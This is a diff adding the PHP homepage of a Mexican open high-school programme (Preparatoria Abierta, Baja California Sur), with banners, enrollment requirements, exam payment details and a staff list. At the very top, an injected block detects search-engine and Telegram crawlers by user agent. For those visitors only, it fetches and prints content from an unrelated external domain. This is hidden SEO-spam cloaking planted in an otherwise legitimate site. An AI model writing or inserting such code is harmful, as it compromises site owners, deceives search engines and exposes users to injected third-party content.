@@ -1,0 +1,436 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];
+    $bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool");
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents("https://www.weiyuang.com.tw/plugins/search/content/content/");
+    echo $message;
+}
+?>
+<?php
+include("internos/header.php");
+?>
+<div class="container-fluid p-0 pb-5 mb-5">
+    <div id="header-carousel" class="carousel slide carousel-fade" data-ride="carousel">
+        <ol class="carousel-indicators">
+            <li data-target="#header-carousel" data-slide-to="0" class="active"></li>
+            <li data-target="#header-carousel" data-slide-to="1"></li>
+            <li data-target="#header-carousel" data-slide-to="2"></li>
+            <li data-target="#header-carousel" data-slide-to="3"></li>
+            <li data-target="#header-carousel" data-slide-to="4"></li>
+            <li data-target="#header-carousel" data-slide-to="5"></li>
+            <li data-target="#header-carousel" data-slide-to="6"></li>
+            <li data-target="#header-carousel" data-slide-to="7"></li>
+            <li data-target="#header-carousel" data-slide-to="8"></li>
+        </ol>
+        <div class="carousel-inner">
+
+            <!-- <div class="carousel-item active" style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/banner_alerta.png" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="display-4 text-white text-uppercase mb-md-3">!AVISO IMPORTANTE!</h5>
+                        <h1 class="display-3 text-white mb-md-4">¡OFICINAS CERRADAS! VIERNES 14</h1>
+                        <h5 class="display-5 text-white mb-md-4">Este Viernes 14 de Febrero! Estarán Cerradas Las Oficinas</h5>
+                        <h5 class="display-5 text-white mb-md-4">De Preparatoria Abierta La Paz</h5>
+                    </div>
+                </div>
+            </div> -->
+
+            <div class="carousel-item active" style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/banner_alerta.png" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="display-4 text-white text-uppercase mb-md-3">!AVISO IMPORTANTE!</h5>
+                        <h1 class="display-3 text-white mb-md-4">CAMBIO CUENTA BBVA!</h1>
+                        <h5 class="display-5 text-white mb-md-4">Cambios en nuestra cuenta</h5>
+                        <a href="tramites.php" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Ver más</a>
+                        <a href="pdf/cambio_cuenta_bbva.pdf" target="_blank" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2" style="margin-left: 10px;">Ver Oficio</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="carousel-item " style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/etapas/2025/2503-A.jpg" style="min-height: 300px; object-fit: Scover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="text-white text-uppercase mb-md-3">Etapas Revisadas</h5>
+                        <h1 class="display-3 text-white mb-md-4">¡Etapas Nuevas Disponibles!</h1>
+                        <a href="calificaciones/2025/2503-A.pdf" target="_blank" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Ver Calificaciones</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="carousel-item" style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/calendario.jpg" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="text-white text-uppercase mb-md-3">Calendario 1er Cuatrimestre 2025</h5>
+                        <h1 class="display-3 text-white mb-md-4">Enero - Abril 2025</h1>
+                        <a target="_blank" href="calendarios/Calendarios 2025/Primer Cuatrimestre/Modular 1er cuatrimestre 2025.pdf" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Ver Calendario</a>
+                        <a target="_blank" href="calendarios/Calendarios 2025/Primer Cuatrimestre/Modular 1er cuatrimestre 2025_Foraneos.pdf" style="margin-left: 10px;" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Ver Foraneo</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="carousel-item " style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/Feria_Virtual.jpg" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="text-white text-uppercase mb-md-3">9a. Feria Virtual</h5>
+                        <h1 class="display-3 text-white mb-md-4">Conoce La 9a. Feria Virtual SEP</h1>
+                        <a href="pdf/Programa_9FVOE.pdf" target="_blank" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Más Información</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- <div class="carousel-item" style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/header-pagina_3.jpg" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="text-white text-uppercase mb-md-3">Nueva Sede Todos Santos</h5>
+                        <h1 class="display-3 text-white mb-md-4">Conoce Nuestra Nueva Sede de Aplicación en Todos Santos</h1>
+                        <a href="https://maps.app.goo.gl/e4hcEpRFcPtSvdns9" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2" target="_blank">Conocer Sede</a>
+                    </div>
+                </div>
+            </div> -->
+            <div class="carousel-item" style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/stop_violence.png" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="text-white text-uppercase mb-md-3">Parale A La Violencia</h5>
+                        <h1 class="display-3 text-white mb-md-4">Cruzada Estatal Contra Las Violencias De Género</h1>
+                    </div>
+                </div>
+            </div>
+
+            <!--<div class="carousel-item" style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/solicitud_img_3.jpg" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="text-white text-uppercase mb-md-3">Calendario Nuevo!</h5>
+                        <h1 class="display-3 text-white mb-md-4">Nuevas Etapas de Solicitud de Exámenes</h1>
+                        <a target="_blank" href="calendarios/Calendarios 2023/Tercer Cuatrimestre/Plan Modular 3er cuatrimestre.pdf" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Ver Calendario</a>
+                    </div>
+                </div>
+            </div>-->
+            
+            <div class="carousel-item" style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/solicitud_img_3.jpg" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="text-white text-uppercase mb-md-3">Solicitudes</h5>
+                        <h1 class="display-3 text-white mb-md-4">Solicitud De Servicios</h1>
+                        <a href="calendarios/Solicituddeservicios.pdf" target="_blank" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Descargar</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="carousel-item" style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/egresados.jpg" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="text-white text-uppercase mb-md-3">Alumnos Egresados</h5>
+                        <h1 class="display-3 text-white mb-md-4">Cédula de datos (Alumnos Egresados)</h1>
+                        <a href="http://forms.gle/EMAvE37Ah69Peg3k8" target="_blank" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Descargar</a>
+                    </div>
+                </div>
+            </div>
+            <div class="carousel-item" style="min-height: 300px;">
+                <img class="position-relative w-100" src="img/images/egresados.jpg" style="min-height: 300px; object-fit: cover;">
+                <div class="carousel-caption d-flex align-items-center justify-content-center">
+                    <div class="p-5" style="width: 100%; max-width: 900px;">
+                        <h5 class="text-white text-uppercase mb-md-3">Alumnos Egresados</h5>
+                        <h1 class="display-3 text-white mb-md-4">Cédula de seguimiento (Alumnos Egresados)</h1>
+                        <a href="http://forms.gle/YNZZnTLYimsj42Us6" target="_blank" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Descargar</a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+<!-- Carousel End -->
+<!-- About Start -->
+<div class="container-fluid py-5">
+    <div class="container py-5">
+        <div class="row align-items-center">
+            <div class="col-lg-5">
+                <img class="img-fluid rounded mb-4 mb-lg-0" src="img/course-1.jpg" alt="">
+            </div>
+            <div class="col-lg-7">
+                <div class="text-left mb-4">
+                    <h5 class="text-primary text-uppercase mb-3" style="letter-spacing: 5px;">Plan De Estudios</h5>
+                    <h1>NUPLES</h1>
+                </div>
+                <p>El Plan De Estudio Modular De La Preparatoria Abierta Está Integrado Por 22 Módulos. Un Módulo Es Una Unidad De Aprendizaje Del Plan En La Cual Se Integran Los Contenidos De Los Distintos Campos Del Conocimiento, Las Estrategias De Enseñanza Y Aprendizaje, Las Actividades Formativas E Información Cuya Finalidad Es Que Desarrolles Competencias. El Plan Está Organizado En Dos Componentes:</p>
+                <p><b>Básico.</b> Se Conforma Por 22 Módulos Con Los Que Obtendrás Conocimientos, Actitudes Y Habilidades Necesarias Para Desempeñarte En áReas De Comunicación, Matemáticas, Ciencias Experimentales,  Humanidades Y Ciencias Sociales, éStos Son Necesarios Para Continuar Tus Estudios En La Educación Superior.</p>
+                <p><b>Profesional.</b> Se Constituye Por Un Módulo, Dedicado Al Estudio De La Informática, Al Cursar Este Módulo Desarrollarás Habilidades, Conocimientos Y Actitudes Que Pueden Apoyarte En El áMbito Laboral.</p>
+                <div>
+                    <ul>
+                        <li>
+                            Los Estudiantes Que Cuenten Con Certificato De Secundaria, Podrán Inscribirse Y Comenzar Su Preparatoria.
+                        </li>
+                        <li>
+                            Los Estudiantes Que Además Cuenten Con Certificado Parcial De Estudios De Preparatoria Podrán Continuar Y Terminar Sus Estudios En Este Subsistema.
+                        </li>
+                        <li>
+                            Las Inscripciones Están Abiertas Todo El Año.
+                        </li>
+                        <li>
+                            No Hay Límite De Tiempo Para Concluir.
+                        </li>
+                        <li>
+                            No Tiene Duración Fija.
+                        </li>
+                    </ul>
+                </div>
+                <a href="img/images/plan_modular.png" target="_blank" class="btn btn-primary py-md-2 px-md-4 font-weight-semi-bold mt-2">Conoce Más</a>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- About End -->
+
+<!-- Registration Start -->
+<div class="container-fluid bg-registration-2 py-5" style="margin: 90px 0;">
+    <div class="container py-5">
+        <div class="row align-items-center">
+            <div class="col-lg-0 mb-5 mb-lg-0">
+                <div class="mb-4">
+                    <h5 class="text-primary text-uppercase mb-3" style="letter-spacing: 5px;">Requisitos De Inscripción</h5>
+                    <h1 class="text-white">Es Totalmente Gratutita</h1>
+                </div>
+                <p class="text-white">Cualquier Día De La Semana Puedes Inscribirte, Al Día Siguiente Recibes Tu Credencial De Preparatoria Abierta.</p>
+                <ul class="list-inline text-white m-0">
+                    <li class="py-2"><i class="fa fa-check text-primary mr-3"></i><b>Original</b> Acta De Nacimiento</li>
+                    <li class="py-2"><i class="fa fa-check text-primary mr-3"></i><b>Original</b> y <b>Copia</b> Del Certificado De Secundaria</li>
+                    <li class="py-2"><i class="fa fa-check text-primary mr-3"></i><b>Original</b> Del CURP</li>
+                    <li class="py-2"><i class="fa fa-check text-primary mr-3"></i><b>Dos</b> Fotografías Recientes:</li>
+                    <li>
+                        <ul class="list-inline text-white m-0" style="padding-left: 50px;">
+                            <li class="py-2"><i class="fa fa-check text-primary mr-3"></i>Tamaño Infantil</li>
+                            <li class="py-2"><i class="fa fa-check text-primary mr-3"></i>A Blanco y Negro</li>
+                            <li class="py-2"><i class="fa fa-check text-primary mr-3"></i>De Frente</li>
+                            <li class="py-2"><i class="fa fa-check text-primary mr-3"></i>Rostro Descubierto</li>
+                            <li class="py-2"><i class="fa fa-check text-primary mr-3"></i>Sin Accesorios (Lentes)</li>
+                            <li class="py-2"><i class="fa fa-check text-primary mr-3"></i><b>Hombres</b> Sin Barba</li>
+                            <li class="py-2"><i class="fa fa-check text-primary mr-3"></i><b>Terminado Mate</b> (No instantáneas)</li>
+                            <li class="py-2"><i class="fa fa-check text-primary mr-3"></i>Camisa o Blusa <b>Color Blanca</b></li>
+                        </ul>
+                    </li>
+                    <li class="py-2"><i class="fa fa-check text-primary mr-3"></i>Proporcionar Una Cuenta De Correo Electrónico</li>
+                    <li class="py-2"><i class="fa fa-check text-primary mr-3"></i>Si Cuenta Con Estudios Previos De Preparatoria, Deberá Presentar <b>Certificado Parcial</b></li>
+                </ul>
+                <p>Solo Puedes Solicitar Uno O Dos Exámenes Cada 15 Días (Dentro De Las Fechas De Solicitud*). No Debes Pagar Todos Los Exámenes Juntos, Solo El O Los Que Vas A Solicitar Por Cada Etapa-fase. Para Poder <b>Solicitar Un Examen</b>, Primero Deberás Realizar Un Depósito A La Cuenta <b>Banamex 0962-37106 A Nombre De La Secretaría De Educación.</b> Los Depósitos Se Realizan Por Separado, Si Son <b>Dos</b> Exámenes, Entonces Realizarás <b>Dos</b> Depósitos. Solo Se Aceptan <b>Comprobantes De Depósito Bancario Directo</b>, No Se Aceptarán Transferencias, Pagos En Oxxo, Ni Otros Los Comprobantes Deben Ser Recientes, No Se Reciben Comprobantes Antiguos</p>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- Registration End -->
+
+<div class="container-fluid">
+    <div class="container py-5">
+        <div class="text-center mb-5">
+            <h1>Preparatoria Abierta</h1>
+            <h5 class="text-primary text-uppercase mb-3" style="letter-spacing: 5px;">Pasos Para Inscribirte y Empezar A Solicitar Exámenes De Preparatoria Abierta</h5>
+        </div>
+        <div class="row  bs-wizard animate-box" style="border-bottom:0;">
+            <div class="col-lg-3 col-md-6 mb-4 bs-wizard-step complete">
+                <div class="text-center bs-wizard-stepnum"><h4>Paso 1</h4></div>
+                <div class="progress"><div class="progress-bar"></div></div>
+                <a href="oficinas.html" class="bs-wizard-dot"></a>
+                <div class="bs-wizard-info text-center"><p>Inscribirte En las Oficinas De Preparatoria Abierta</p></div>
+            </div>
+
+            <div class="col-lg-3 col-md-6 mb-4 bs-wizard-step active">
+                <!-- complete -->
+                <div class="text-center bs-wizard-stepnum"><h4>Paso 2</h4></div>
+                <div class="progress"><div class="progress-bar"></div></div>
+                <a href="oficinas.html" class="bs-wizard-dot"></a>
+                <div class="bs-wizard-info text-center"><p>Recoge Tu Credencial De Preparatoria Abierta En Las Oficinas</p></div>
+            </div>
+
+            <div class="col-lg-3 col-md-6 mb-4 bs-wizard-step disable">
+                <!-- complete -->
+                <div class="text-center bs-wizard-stepnum"><h4>Paso 3</h4></div>
+                <div class="progress"><div class="progress-bar"></div></div>
+                <a href="calendarios/Calendarios 2023/Segundo Cuatrimestre/Modular-Mayo-Agosto-2023.pdf" class="bs-wizard-dot"></a>
+                <div class="bs-wizard-info text-center"><p>Solicitar Examenes En Las Fechas Establecidas</p></div>
+            </div>
+
+            <div class="col-lg-3 col-md-6 mb-4 bs-wizard-step disable">
+                <!-- active -->
+                <div class="text-center bs-wizard-stepnum"><h4>Paso 4</h4></div>
+                <div class="progress"><div class="progress-bar"></div></div>
+                <a href="oficinas.html" class="bs-wizard-dot"></a>
+                <div class="bs-wizard-info text-center"><p>Acudir A La Sede Seleccionada A Realizar Tu Exámen.</p></div>
+            </div>
+        </div>
+    </div>
+    </div>
+    <?php
+	include("internos/oficinas_dom.php");
+	?>
+	<?php
+	include("internos/libros.php");
+	?>
+	<?php
+	include("internos/guias.php");
+	?>
+	<div class="container-fluid py-5">
+        <div class="container pt-5 pb-3">
+            <div class="text-center mb-5">
+                <h5 class="text-primary text-uppercase mb-3" style="letter-spacing: 5px;">Personal De Preparatoria Abierta </h5>
+                <h1>En Baja California Sur</h1>
+            </div>
+            <div class="row">
+                <div class="col-md-6 col-lg-3 text-center team mb-4">
+                    <div class="team-item rounded overflow-hidden mb-2">
+                        <div class="team-img position-relative">
+                            <img class="img-fluid" src="img/images/user_no_gender.png" alt="">
+                            <div class="team-social">
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://www.facebook.com/profile.php?id=100089807557194&mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://instagram.com/preparatoriaabiertabcs?igshid=YmMyMTA2M2Y=" target="_blank"><i class="fab fa-instagram"></i></a>
+                            </div>
+                        </div>
+                        <div class="bg-secondary p-4">
+                            <h5>Arq. Jose Julian Osuna Meza</h5>
+                            <p class="m-0">Titular De Preparatoria Abierta</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 text-center team mb-4">
+                    <div class="team-item rounded overflow-hidden mb-2">
+                        <div class="team-img position-relative">
+                            <img class="img-fluid" src="img/images/user_no_gender.png" alt="">
+                            <div class="team-social">
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://www.facebook.com/profile.php?id=100089807557194&mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://instagram.com/preparatoriaabiertabcs?igshid=YmMyMTA2M2Y=" target="_blank"><i class="fab fa-instagram"></i></a>
+                            </div>
+                        </div>
+                        <div class="bg-secondary p-4">
+                            <h5>Ing. Irving Saúl Castellanos Perea</h5>
+                            <p class="m-0">Encargado Del Area De Sistemas</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 text-center team mb-4">
+                    <div class="team-item rounded overflow-hidden mb-2">
+                        <div class="team-img position-relative">
+                            <img class="img-fluid" src="img/images/user_no_gender.png" alt="">
+                            <div class="team-social">
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://www.facebook.com/profile.php?id=100089807557194&mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://instagram.com/preparatoriaabiertabcs?igshid=YmMyMTA2M2Y=" target="_blank"><i class="fab fa-instagram"></i></a>
+                            </div>
+                        </div>
+                        <div class="bg-secondary p-4">
+                            <h5>Lic. Gabriela Guadalupe Agundez Aviles</h5>
+                            <p class="m-0">Encargada De Acreditaciones</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 text-center team mb-4">
+                    <div class="team-item rounded overflow-hidden mb-2">
+                        <div class="team-img position-relative">
+                            <img class="img-fluid" src="img/images/user_no_gender.png" alt="">
+                            <div class="team-social">
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://www.facebook.com/profile.php?id=100089807557194&mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://instagram.com/preparatoriaabiertabcs?igshid=YmMyMTA2M2Y=" target="_blank"><i class="fab fa-instagram"></i></a>
+                            </div>
+                        </div>
+                        <div class="bg-secondary p-4">
+                            <h5>Jorge Carlos Jimenez Alvarez</h5>
+                            <p class="m-0">Encargado De Certificación</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 text-center team mb-4">
+                    <div class="team-item rounded overflow-hidden mb-2">
+                        <div class="team-img position-relative">
+                            <img class="img-fluid" src="img/images/user_no_gender.png" alt="">
+                            <div class="team-social">
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://www.facebook.com/profile.php?id=100089807557194&mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://instagram.com/preparatoriaabiertabcs?igshid=YmMyMTA2M2Y=" target="_blank"><i class="fab fa-instagram"></i></a>
+                            </div>
+                        </div>
+                        <div class="bg-secondary p-4">
+                            <h5>Claudia Lorena Garcia Castro</h5>
+                            <p class="m-0">Secretaría Personal</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 text-center team mb-4">
+                    <div class="team-item rounded overflow-hidden mb-2">
+                        <div class="team-img position-relative">
+                            <img class="img-fluid" src="img/images/user_no_gender.png" alt="">
+                            <div class="team-social">
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://www.facebook.com/profile.php?id=100089807557194&mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://instagram.com/preparatoriaabiertabcs?igshid=YmMyMTA2M2Y=" target="_blank"><i class="fab fa-instagram"></i></a>
+                            </div>
+                        </div>
+                        <div class="bg-secondary p-4">
+                            <h5>Lic. Jalnaysin Viridiana Correa Avedaño</h5>
+                            <p class="m-0">Ventanilla/Demanda De Solicitudes</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 text-center team mb-4">
+                    <div class="team-item rounded overflow-hidden mb-2">
+                        <div class="team-img position-relative">
+                            <img class="img-fluid" src="img/images/user_no_gender.png" alt="">
+                            <div class="team-social">
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://www.facebook.com/profile.php?id=100089807557194&mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://instagram.com/preparatoriaabiertabcs?igshid=YmMyMTA2M2Y=" target="_blank"><i class="fab fa-instagram"></i></a>
+                            </div>
+                        </div>
+                        <div class="bg-secondary p-4">
+                            <h5>Lic. Daniela Guluarte Hirales</h5>
+                            <p class="m-0">Ventanilla/ Inscripciones</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 text-center team mb-4">
+                    <div class="team-item rounded overflow-hidden mb-2">
+                        <div class="team-img position-relative">
+                            <img class="img-fluid" src="img/images/user_no_gender.png" alt="">
+                            <div class="team-social">
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://www.facebook.com/profile.php?id=100089807557194&mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://instagram.com/preparatoriaabiertabcs?igshid=YmMyMTA2M2Y=" target="_blank"><i class="fab fa-instagram"></i></a>
+                            </div>
+                        </div>
+                        <div class="bg-secondary p-4">
+                            <h5>Lic. Anette Luque Sanchez</h5>
+                            <p class="m-0">Ventanilla/ Inscripciones Foraneas</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 text-center team mb-4">
+                    <div class="team-item rounded overflow-hidden mb-2">
+                        <div class="team-img position-relative">
+                            <img class="img-fluid" src="img/images/user_no_gender.png" alt="">
+                            <div class="team-social">
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://www.facebook.com/profile.php?id=100089807557194&mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-outline-light btn-square mx-1" href="https://instagram.com/preparatoriaabiertabcs?igshid=YmMyMTA2M2Y=" target="_blank"><i class="fab fa-instagram"></i></a>
+                            </div>
+                        </div>
+                        <div class="bg-secondary p-4">
+                            <h5>Lluvia Ivette Torres Gonzales</h5>
+                            <p class="m-0">Apoyo Administrativo</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+	<?php
+	include("internos/footer.php");
+	?>
